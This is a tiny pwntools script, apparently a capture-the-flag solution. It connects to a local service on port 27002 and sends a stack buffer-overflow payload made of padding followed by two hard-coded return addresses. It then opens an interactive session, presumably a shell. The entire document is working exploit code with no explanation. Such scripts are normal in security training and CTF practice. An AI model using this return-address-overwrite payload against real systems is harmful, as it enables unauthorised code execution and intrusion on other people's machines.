from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27002)

payload = b"a" * 0x40 + b"b" * 8 + p64(0x40101a) + p64(0x4014ba)
p.sendafter("wish: ", payload)

p.interactive()
